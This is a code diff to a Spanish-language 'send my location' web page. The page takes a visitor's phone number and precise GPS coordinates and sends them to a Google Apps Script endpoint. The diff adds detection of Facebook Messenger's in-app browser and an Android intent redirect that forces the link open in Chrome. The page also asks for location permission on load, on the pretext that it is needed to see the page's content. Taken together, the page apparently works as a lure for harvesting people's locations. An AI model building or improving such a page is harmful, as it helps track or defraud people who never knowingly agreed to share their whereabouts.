@@ -12,11 +12,11 @@
       background-color: #f5f5f5;
     }
     h1 {
-      font-size: 36px;  /* 标题更大 */
+      font-size: 36px;
       margin-bottom: 30px;
     }
     input, button {
-      font-size: 22px;  /* 输入框和按钮字体更大 */
+      font-size: 22px;
       padding: 15px;
       margin: 15px auto;
       width: 90%;
@@ -52,50 +52,89 @@
       margin: 20px auto;
       width: 90%;
       max-width: 400px;
-      font-family: sans-serif;
       box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       text-align: left;
       line-height: 1.4;
+    }
+    #messenger-warning {
+      display: none;
+      background-color: #d1ecf1;
+      color: #0c5460;
+      padding: 20px;
+      border-radius: 10px;
+      margin: 20px auto;
+      max-width: 400px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      font-size: 18px;
+    }
+    #open-in-chrome {
+      display: none;
+      margin-top: 15px;
+      padding: 15px 25px;
+      font-size: 20px;
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <h1>📍 Enviar mi ubicación</h1>
+
+  <div id="messenger-warning">
+    Esta página no funciona bien en el navegador de Messenger.<br/>
+    Por favor, abre esta página en Google Chrome para enviar correctamente la ubicación.
+    <button id="open-in-chrome">Abrir en Google Chrome</button>
+  </div>
+
   <input type="text" id="phone" placeholder="Tu número de teléfono" />
-  <button onclick="sendLocation()">Enviar ubicación</button>
+  <button id="send-btn">Enviar ubicación</button>
   <div id="status"></div>
- 
+
   <div id="ubicacion-alerta">
     📍 <strong>Ubicación desactivada</strong><br><br>
     Para acceder correctamente al contenido de esta página, por favor permite el acceso a tu ubicación.<br><br>
     👉 Toca el ícono del candado 🔒 en la barra de direcciones, ve a <strong>“Permisos”</strong> y selecciona <strong>“Permitir ubicación”</strong>.<br><br>
     Luego recarga esta página. 🙏
   </div>
- 
+
   <script>
     const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyIRvW6Eu9hMQUchZf8ZfkPfOJlDH3ik1wHJPmOTKXGbhNlodQG0iq25iI-5X67j2IaYQ/exec';
- 
+
+    function isMessengerBrowser() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      return /FBAN|FBAV|Messenger/i.test(ua);
+    }
+
+    function openInChrome() {
+      const url = window.location.href;
+      const intentUrl = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+      window.location.href = intentUrl;
+    }
+
     function sendLocation() {
       const phone = document.getElementById('phone').value.trim();
       const statusDiv = document.getElementById('status');
       const alertaDiv = document.getElementById('ubicacion-alerta');
       statusDiv.innerText = "";
       alertaDiv.style.display = "none";
- 
+
       if (!phone) {
         alert("Por favor, ingresa tu número de teléfono.");
         return;
       }
- 
+
       if (!navigator.geolocation) {
         alert("Tu navegador no soporta la geolocalización.");
         return;
       }
- 
+
       navigator.geolocation.getCurrentPosition(position => {
         const lat = position.coords.latitude;
         const lng = position.coords.longitude;
- 
+
         fetch(`${SCRIPT_URL}?phone=${encodeURIComponent(phone)}&lat=${lat}&lng=${lng}`)
           .then(response => response.text())
           .then(result => {
@@ -105,7 +144,7 @@
             statusDiv.innerText = "❌ Error al enviar los datos.";
             console.error(error);
           });
- 
+
       }, error => {
         if (error.code === error.PERMISSION_DENIED) {
           alertaDiv.style.display = "block";
@@ -114,10 +153,10 @@
         }
       });
     }
- 
+
     function verificarUbicacion() {
       if (!navigator.geolocation) return;
- 
+
       navigator.geolocation.getCurrentPosition(
         () => {
           document.getElementById('ubicacion-alerta').style.display = 'none';
@@ -130,20 +169,25 @@
       );
     }
 
-    // --- 新增：检测Messenger内置浏览器，提醒用户 ---
-    function redirigirSiMessenger() {
-      const ua = navigator.userAgent || navigator.vendor || window.opera;
-      const esMessenger = ua.includes("FBAN") || ua.includes("FBAV");
+    window.onload = () => {
+      if (isMessengerBrowser()) {
+        document.getElementById('messenger-warning').style.display = 'block';
+        document.getElementById('open-in-chrome').onclick = openInChrome;
 
-      if (esMessenger) {
-        alert("⚠️ Por favor abre esta página en tu navegador (Chrome o Safari) para continuar.");
+        // 隐藏输入和发送按钮，避免误操作
+        document.getElementById('phone').style.display = 'none';
+        document.getElementById('send-btn').style.display = 'none';
+      } else {
+        // 非Messenger浏览器，正常显示输入和发送按钮
+        document.getElementById('phone').style.display = 'block';
+        document.getElementById('send-btn').style.display = 'block';
+        document.getElementById('messenger-warning').style.display = 'none';
+
+        verificarUbicacion();
+
+        document.getElementById('send-btn').onclick = sendLocation;
       }
     }
-
-    window.onload = function() {
-      verificarUbicacion();
-      redirigirSiMessenger();
-    };
   </script>
 </body>
 </html>
